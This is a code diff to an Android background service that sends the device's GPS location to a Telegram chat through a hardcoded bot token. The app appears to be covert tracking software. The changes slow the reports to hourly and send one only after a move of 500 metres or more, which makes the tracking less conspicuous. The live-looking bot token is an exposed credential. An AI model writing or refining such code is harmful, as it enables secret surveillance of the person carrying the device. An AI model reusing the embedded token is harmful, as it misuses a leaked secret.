@@ -15,17 +15,18 @@ import com.example.newdynamicapk.Constants; // Importing the Constants class
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Timer;
-import java.util.TimerTask;
 
 public class LocationService extends Service {
 
     private static final String TAG = "LocationService";
     private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
-    private static final long LOCATION_UPDATE_INTERVAL = 60000; // 1 minute in milliseconds
+    private static final long LOCATION_UPDATE_INTERVAL = 3600000; // 1 hour in milliseconds
+    private static final float LOCATION_CHANGE_THRESHOLD = 500.0f; // 500 meters
+
     private LocationManager locationManager;
     private LocationListener locationListener;
-    private String chatId; // Chat ID to send location dynamically
+    private String chatId;
+    private Location lastKnownLocation = null;
 
     @Override
     public void onCreate() {
@@ -33,7 +34,7 @@ public class LocationService extends Service {
         Log.d(TAG, "Service created");
 
         // Retrieve the chat ID dynamically
-        chatId = Constants.TELEGRAM_CHAT_ID; // Replace with how you're managing the chat ID retrieval
+        chatId = Constants.TELEGRAM_CHAT_ID;
 
         // Initialize location updates
         startLocationUpdates();
@@ -47,11 +48,16 @@ public class LocationService extends Service {
 
     private void startLocationUpdates() {
         locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+
         locationListener = new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
                 Log.d(TAG, "Location changed: " + location.getLatitude() + ", " + location.getLongitude());
-                sendLocationToTelegram(location);
+
+                if (shouldSendLocationUpdate(location)) {
+                    sendLocationToTelegram(location);
+                    lastKnownLocation = location; // Update the last known location
+                }
             }
 
             @Override
@@ -67,13 +73,23 @@ public class LocationService extends Service {
         try {
             locationManager.requestLocationUpdates(
                     LocationManager.GPS_PROVIDER,
-                    LOCATION_UPDATE_INTERVAL,
-                    0,
+                    LOCATION_UPDATE_INTERVAL, // Poll every 1 hour
+                    0, // Minimal distance (handled in logic)
                     locationListener
             );
         } catch (SecurityException e) {
             Log.e(TAG, "Location permission not granted", e);
         }
+    }
+
+    private boolean shouldSendLocationUpdate(Location location) {
+        // Check if the location has changed significantly
+        if (lastKnownLocation == null) {
+            return true; // First update
+        }
+
+        float distance = lastKnownLocation.distanceTo(location);
+        return distance >= LOCATION_CHANGE_THRESHOLD; // Only send update if the distance is above the threshold
     }
 
     private void sendLocationToTelegram(Location location) {
